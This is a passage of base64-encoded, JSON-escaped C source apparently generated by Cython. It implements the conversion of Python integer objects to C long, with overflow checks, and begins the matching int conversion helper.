VNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc05lZyh4KSkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIF9fUHl4X2NvbXBhY3RfdXB5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZVVuc2lnbmVkKHgpKVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7XG4gICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTtcbiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpIHtcbiAgICAgICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSA+PSAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSA+PSA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBN1xuICAgICAgICBpZiAodW5saWtlbHkoUHlfU0laRSh4KSA8IDApKSB7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfVxuI2Vsc2VcbiAgICAgICAge1xuICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh4LCBQeV9GYWxzZSwgUHlfTFQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKVxuICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0ID09IDEpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgaWYgKChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIGxvbmcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZyh4KSlcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzVW5zaWduZWRMb25nTG9uZyh4KSlcbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3B5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAtMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgLTM6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgLTQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgbG9uZywgUHlMb25nX0FzTG9uZyh4KSlcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZihQWV9MT05HX0xPTkcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpXG4gICAgICAgIH1cbiAgICB9XG4gICAge1xuICAgICAgICBsb25nIHZhbDtcbiAgICAgICAgaW50IHJldCA9IC0xO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTYgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcyhcbiAgICAgICAgICAgIHgsICZ2YWwsIHNpemVvZih2YWwpLCBQeV9BU05BVElWRUJZVEVTX05BVElWRV9FTkRJQU4gfCAoaXNfdW5zaWduZWQgPyBQeV9BU05BVElWRUJZVEVTX1VOU0lHTkVEX0JVRkZFUiB8IFB5X0FTTkFUSVZFQllURVNfUkVKRUNUX05FR0FUSVZFIDogMCkpO1xuICAgICAgICBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID09IC0xKSkge1xuICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXQgPSAwO1xuICAgICAgICB9XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgJiYgIShDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgfHwgZGVmaW5lZChfUHlMb25nX0FzQnl0ZUFycmF5KVxuICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTtcbiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWw7XG4gICAgICAgIHJldCA9IF9QeUxvbmdfQXNCeXRlQXJyYXkoKFB5TG9uZ09iamVjdCAqKXgsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc19saXR0bGUsICFpc191bnNpZ25lZCk7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqdjtcbiAgICAgICAgUHlPYmplY3QgKnN0ZXB2YWwgPSBOVUxMLCAqbWFzayA9IE5VTEwsICpzaGlmdCA9IE5VTEw7XG4gICAgICAgIGludCBiaXRzLCByZW1haW5pbmdfYml0cywgaXNfbmVnYXRpdmUgPSAwO1xuICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7XG4gICAgICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QoeCkpKSB7XG4gICAgICAgICAgICB2ID0gX19QeXhfTmV3UmVmKHgpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdiA9IFB5TnVtYmVyX0xvbmcoeCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXYpKSByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTtcbiAgICAgICAgfVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlzX25lZ2F0aXZlID0gcmVzdWx0ID09IDE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KGlzX25lZ2F0aXZlKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoaXNfbmVnYXRpdmUpIHtcbiAgICAgICAgICAgIHN0ZXB2YWwgPSBQeU51bWJlcl9JbnZlcnQodik7XG4gICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXN0ZXB2YWwpKVxuICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzdGVwdmFsID0gdjtcbiAgICAgICAgfVxuICAgICAgICB2ID0gTlVMTDtcbiAgICAgICAgdmFsID0gKGxvbmcpIDA7XG4gICAgICAgIG1hc2sgPSBQeUxvbmdfRnJvbUxvbmcoKDFMIDw8IGNodW5rX3NpemUpIC0gMSk7IGlmICh1bmxpa2VseSghbWFzaykpIGdvdG8gZG9uZTtcbiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7XG4gICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YobG9uZykgKiA4IC0gY2h1bmtfc2l6ZTsgYml0cyArPSBjaHVua19zaXplKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdG1wLCAqZGlnaXQ7XG4gICAgICAgICAgICBsb25nIGlkaWdpdDtcbiAgICAgICAgICAgIGRpZ2l0ID0gUHlOdW1iZXJfQW5kKHN0ZXB2YWwsIG1hc2spO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFkaWdpdCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGRpZ2l0KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzO1xuICAgICAgICAgICAgdG1wID0gUHlOdW1iZXJfUnNoaWZ0KHN0ZXB2YWwsIHNoaWZ0KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdG1wKSkgZ290byBkb25lO1xuICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihzaGlmdCk7IHNoaWZ0ID0gTlVMTDtcbiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDtcbiAgICAgICAge1xuICAgICAgICAgICAgbG9uZyBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKHN0ZXB2YWwpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICByZW1haW5pbmdfYml0cyA9ICgoaW50KSBzaXplb2YobG9uZykgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0ID49ICgxTCA8PCByZW1haW5pbmdfYml0cykpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgICAgICB2YWwgfD0gKChsb25nKSBpZGlnaXQpIDw8IGJpdHM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbCAmICgoKGxvbmcpIDEpIDw8IChzaXplb2YobG9uZykgKiA4IC0gMSkpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKVxuICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMDtcbiAgICBkb25lOlxuICAgICAgICBQeV9YREVDUkVGKHNoaWZ0KTtcbiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTtcbiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkocmV0KSlcbiAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxucmFpc2Vfb3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsXG4gICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBsb25nIik7XG4gICAgcmV0dXJuIChsb25nKSAtMTtcbnJhaXNlX25lZ19vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgImNhblwndCBjb252ZXJ0IG5lZ2F0aXZlIHZhbHVlIHRvIGxvbmciKTtcbiAgICByZXR1cm4gKGxvbmcpIC0xO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQXNfaW50KFB5T2JqZWN0ICp4KSB7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2hcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIlxuI2VuZGlmXG4gICAgY29uc3QgaW50IG5lZ19vbmUgPSAoaW50KSAtMSwgY29uc3RfemVybyA9IChpbnQpIDA7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcFxuI2VuZGlmXG4gICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87XG4gICAgaWYgKHVubGlrZWx5KCFQeUxvbmdfQ2hlY2soeCkpKSB7XG4gICAgICAgIGludCB2YWw7XG4gICAgICAgIFB5T2JqZWN0ICp0bXAgPSBfX1B5eF9QeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfaW50KHRtcCk7XG4gICAgICAgIFB5X0RFQ1JFRih0bXApO1xuICAgICAgICByZXR1cm4gdmFsO1xuICAgI